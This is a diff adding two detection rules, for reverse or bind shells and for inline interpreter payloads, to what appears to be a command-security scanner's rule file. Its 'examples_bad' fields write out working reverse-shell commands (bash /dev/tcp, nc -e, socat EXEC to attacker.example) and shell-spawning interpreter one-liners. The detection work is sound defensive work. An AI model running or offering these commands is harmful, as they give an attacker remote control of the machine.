@@ -487,6 +487,30 @@ remediation = "Verify the upload destination is trusted. Review what data is bei
 mitre_id = "T1048.003"
 
 [[rule]]
+id = "reverse_shell"
+title = "Reverse or bind shell"
+category = "command"
+severity_rationale = "High: a back-connect shell hands an attacker an interactive session on the machine, running commands with the current user's privileges and outside tirith's visibility."
+description = "A command establishes a reverse or bind shell: a bash /dev/tcp or /dev/udp network redirect, nc/ncat/netcat with an exec-on-connect flag (-e/-c/--exec/--sh-exec), or socat with an EXEC:/SYSTEM: target. Interpreter one-liners that open a socket and spawn a shell (python -c 'socket...') are reported as an inline-interpreter suspicious exec instead."
+examples_bad = ["bash -i >& /dev/tcp/attacker.example/4444 0>&1", "nc -e /bin/sh attacker.example 4444", "socat TCP:attacker.example:4444 EXEC:/bin/sh"]
+examples_good = ["nc -zv example.com 443", "socat -V"]
+false_positive_guidance = "A plain nc connectivity check (no -e/-c/--exec) or a /dev/null redirect does not fire. Genuine use of /dev/tcp for a health check is rare; prefer curl or a dedicated tool."
+remediation = "Do not run this. If you did not author it, treat the host as potentially compromised and rotate exposed credentials."
+mitre_id = "T1059"
+
+[[rule]]
+id = "interpreter_suspicious_inline_exec"
+title = "Inline interpreter with suspicious payload"
+category = "command"
+severity_rationale = "High: passing code inline to an interpreter (python -c, node -e, perl -e, ...) that spawns a process, opens a socket, or dynamically executes code is a living-off-the-land technique that hides the payload from a casual reader and from file-based scanners."
+description = "An inline interpreter invocation (python -c, python3 -c, node -e, perl -e, ruby -e, php -r, bun -e) carries a suspicious payload: a dynamic code-exec call (exec/eval/system/os.system/__import__), a process spawn (subprocess/os.exec/child_process/execSync), or a network primitive (socket.socket/urllib/requests/http.client). Fires only when a payload indicator is present, never on a benign one-liner. The base64 decode-execute shape is reported as base64_decode_execute instead, and powershell -Command inline is handled by the PowerShell rules."
+examples_bad = ["python3 -c 'import subprocess; subprocess.call([\"/bin/sh\",\"-i\"])'", "node -e 'require(\"child_process\").execSync(\"id\")'", "perl -e 'system(\"id\")'"]
+examples_good = ["python3 -c 'print(1)'", "python -c 'import json,sys; json.load(sys.stdin)'", "node -e 'console.log(1+1)'"]
+false_positive_guidance = "A one-liner that only computes or prints (no exec/spawn/socket/network call) does not fire. If a legitimate inline script must fetch or spawn, move it to a reviewed file and run that file instead."
+remediation = "Write the code to a file, review it, then run the file. Avoid piping untrusted logic through an inline interpreter flag."
+mitre_id = "T1059"
+
+[[rule]]
 id = "wrapper_chain_too_deep"
 title = "Pipe to over-obfuscated wrapper chain"
 category = "command"
